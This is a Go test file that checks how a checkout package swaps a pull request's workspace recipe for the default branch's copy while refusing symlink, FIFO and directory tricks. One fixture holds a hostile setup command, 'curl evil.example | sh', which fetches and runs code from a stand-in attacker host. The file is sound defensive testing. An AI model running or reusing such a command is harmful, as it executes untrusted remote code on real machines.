package checkout

import (
	"encoding/json"
	"os"
	"path/filepath"
	"syscall"
	"testing"
	"time"

	"github.com/kodustech/kodus-ai/apps/runtime-cell/internal/protocol"
	"github.com/kodustech/kodus-ai/apps/runtime-cell/internal/recipe"
)

func checkout(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	if content != "" {
		_ = os.MkdirAll(filepath.Join(dir, ".kodus"), 0o755)
		if err := os.WriteFile(filepath.Join(dir, recipe.Path), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func read(t *testing.T, dir string) (string, bool) {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dir, recipe.Path))
	if os.IsNotExist(err) {
		return "", false
	}
	if err != nil {
		t.Fatal(err)
	}
	return string(b), true
}

// A PR that edits its recipe does not change how it boots: the claim's
// recipe (the default branch's) replaces the checkout's copy.
func TestClaimRecipeReplacesThePRsCopy(t *testing.T) {
	dir := checkout(t, "version: 1\nsetup: [\"curl evil.example | sh\"]\n")
	content, _ := json.Marshal("version: 1\nservices: {compose: {public: app}}\n")
	if err := ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Path: ".kodus/workspace.runtime.yaml", Content: content}); err != nil {
		t.Fatal(err)
	}
	if got, _ := read(t, dir); got != "version: 1\nservices: {compose: {public: app}}\n" {
		t.Fatalf("recipe %q", got)
	}
	// A checkout with no .kodus at all gets it too.
	empty := checkout(t, "")
	if err := ApplyRecipe(empty, &protocol.ClaimAcquireBodyRecipe{Path: ".kodus/workspace.yaml", Content: content}); err != nil {
		t.Fatal(err)
	}
	if _, ok := read(t, empty); !ok {
		t.Fatal("recipe not written")
	}
}

func TestClaimWithoutDefaultBranchRecipeRemovesThePRsCopy(t *testing.T) {
	dir := checkout(t, "version: 1\n")
	if err := ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Path: ".kodus/workspace.yaml", Content: json.RawMessage("null")}); err != nil {
		t.Fatal(err)
	}
	if _, ok := read(t, dir); ok {
		t.Fatal("the PR's recipe is still there")
	}
	if err := ApplyRecipe(checkout(t, ""), &protocol.ClaimAcquireBodyRecipe{Content: json.RawMessage("null")}); err != nil {
		t.Fatalf("nothing to remove is fine: %v", err)
	}
}

func TestClaimWithoutRecipeLeavesTheCheckout(t *testing.T) {
	dir := checkout(t, "version: 1\n")
	if err := ApplyRecipe(dir, nil); err != nil {
		t.Fatal(err)
	}
	if got, _ := read(t, dir); got != "version: 1\n" {
		t.Fatalf("recipe %q", got)
	}
}

// A .kodus that escapes the checkout is refused by os.Root, not followed.
func TestClaimRecipeNeverWritesOutsideTheCheckout(t *testing.T) {
	dir := checkout(t, "")
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(dir, ".kodus")); err != nil {
		t.Fatal(err)
	}
	content, _ := json.Marshal("version: 1\n")
	if err := ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: content}); err == nil {
		t.Fatal("wrote through a symlink")
	}
	if _, err := os.Stat(filepath.Join(outside, "workspace.yaml")); err == nil {
		t.Fatal("the recipe landed outside the checkout")
	}
}

// It used to write through os.Root, which follows a link that stays inside
// the checkout: a PR that planted .kodus/workspace.yaml as a link to one of
// its files had the recipe written over that file.
func TestClaimRecipeReplacesALinkAtItsPathWithoutFollowingIt(t *testing.T) {
	dir := checkout(t, "")
	_ = os.MkdirAll(filepath.Join(dir, "src"), 0o755)
	_ = os.MkdirAll(filepath.Join(dir, ".kodus"), 0o755)
	if err := os.WriteFile(filepath.Join(dir, "src/app.js"), []byte("app"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../src/app.js", filepath.Join(dir, recipe.Path)); err != nil {
		t.Fatal(err)
	}
	content, _ := json.Marshal("version: 1\n")
	if err := ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: content}); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(filepath.Join(dir, "src/app.js")); string(b) != "app" {
		t.Fatalf("the link's target was written: %q", b)
	}
	st, err := os.Lstat(filepath.Join(dir, recipe.Path))
	if err != nil || !st.Mode().IsRegular() {
		t.Fatalf("the recipe is not a regular file in place of the link: %v %v", st, err)
	}
	if got, _ := read(t, dir); got != "version: 1\n" {
		t.Fatalf("recipe %q", got)
	}
	entries, _ := os.ReadDir(filepath.Join(dir, ".kodus"))
	if len(entries) != 1 {
		t.Fatalf("a temp file was left: %v", entries)
	}
}

// It used to follow a .kodus linked to another directory of the checkout,
// writing (or removing) that directory's workspace.yaml.
func TestClaimRecipeRefusesAKodusLinkInsideTheCheckout(t *testing.T) {
	dir := checkout(t, "")
	other := filepath.Join(dir, "src")
	_ = os.MkdirAll(other, 0o755)
	if err := os.WriteFile(filepath.Join(other, "workspace.yaml"), []byte("theirs"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("src", filepath.Join(dir, ".kodus")); err != nil {
		t.Fatal(err)
	}
	content, _ := json.Marshal("version: 1\n")
	wantRefused(t, ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: content}), "symbolic link")
	wantRefused(t, ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: json.RawMessage("null")}), "symbolic link")
	if b, _ := os.ReadFile(filepath.Join(other, "workspace.yaml")); string(b) != "theirs" {
		t.Fatalf("written or removed through the .kodus link: %q", b)
	}
}

// A FIFO at the recipe's path is replaced, never opened: opening it to
// write used to block the claim until something read it.
func TestClaimRecipeReplacesAFIFOWithoutBlocking(t *testing.T) {
	dir := checkout(t, "")
	_ = os.MkdirAll(filepath.Join(dir, ".kodus"), 0o755)
	if err := syscall.Mkfifo(filepath.Join(dir, recipe.Path), 0o644); err != nil {
		t.Skip("no mkfifo here:", err)
	}
	content, _ := json.Marshal("version: 1\n")
	done := make(chan error, 1)
	go func() { done <- ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: content}) }()
	select {
	case err := <-done:
		if err != nil {
			t.Fatal(err)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("ApplyRecipe blocked on the FIFO")
	}
	if got, _ := read(t, dir); got != "version: 1\n" {
		t.Fatalf("recipe %q", got)
	}
}

// A directory where the recipe goes fails the claim with the path named.
func TestClaimRecipeRefusesADirectoryAtItsPath(t *testing.T) {
	dir := checkout(t, "")
	if err := os.MkdirAll(filepath.Join(dir, recipe.Path, "x"), 0o755); err != nil {
		t.Fatal(err)
	}
	content, _ := json.Marshal("version: 1\n")
	wantRefused(t, ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: content}), "is a directory")
	wantRefused(t, ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: json.RawMessage("null")}), "is a directory")
	entries, _ := os.ReadDir(filepath.Join(dir, ".kodus"))
	if len(entries) != 1 {
		t.Fatalf("a temp file was left: %v", entries)
	}
}

// Removing the PR's recipe when it is a link removes the link, not its target.
func TestClaimWithoutRecipeRemovesALinkNotItsTarget(t *testing.T) {
	dir := checkout(t, "")
	_ = os.MkdirAll(filepath.Join(dir, ".kodus"), 0o755)
	if err := os.WriteFile(filepath.Join(dir, "app.js"), []byte("app"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../app.js", filepath.Join(dir, recipe.Path)); err != nil {
		t.Fatal(err)
	}
	if err := ApplyRecipe(dir, &protocol.ClaimAcquireBodyRecipe{Content: json.RawMessage("null")}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(filepath.Join(dir, recipe.Path)); !os.IsNotExist(err) {
		t.Fatalf("the link is still there: %v", err)
	}
	if b, _ := os.ReadFile(filepath.Join(dir, "app.js")); string(b) != "app" {
		t.Fatalf("the link's target changed: %q", b)
	}
}
